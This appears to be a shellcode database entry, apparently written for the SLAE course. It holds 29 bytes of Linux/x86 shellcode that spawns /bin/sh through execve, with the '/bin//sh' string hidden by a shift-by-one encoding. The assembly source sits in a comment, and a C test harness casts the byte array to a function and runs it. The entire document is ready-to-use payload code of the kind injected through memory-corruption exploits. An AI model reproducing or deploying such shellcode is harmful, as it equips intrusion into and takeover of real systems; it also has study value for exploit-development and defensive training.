/*
# Title : Linux/x86 - execve(/bin/sh) + RShift-1 Encoded Shellcode (29 bytes)
# Author : Joao Batista
# Date : Jan 2019
# Tested on : i686 GNU/Linux
# Shellcode Length : 29
# SLAE - 1420

global _start

section .text

_start:
        xor ecx,ecx
        mul ecx
        push ecx
        mov esi,0x34399797
        mov edi,0x3734b117
        shl esi,0x1
        shl edi,0x1
        inc esi
        inc edi
        push esi
        push edi
        xchg ebx,esp
        mov al,0xb
        int 0x80
*/
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\x51\xbe\x97\x97\x39\x34\xbf\x17\xb1\x34\x37\xd1\xe6\xd1\xe7\x46\x47\x56\x57\x87\xdc\xb0\x0b\xcd\x80";

main()
{
        printf("shellcode length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}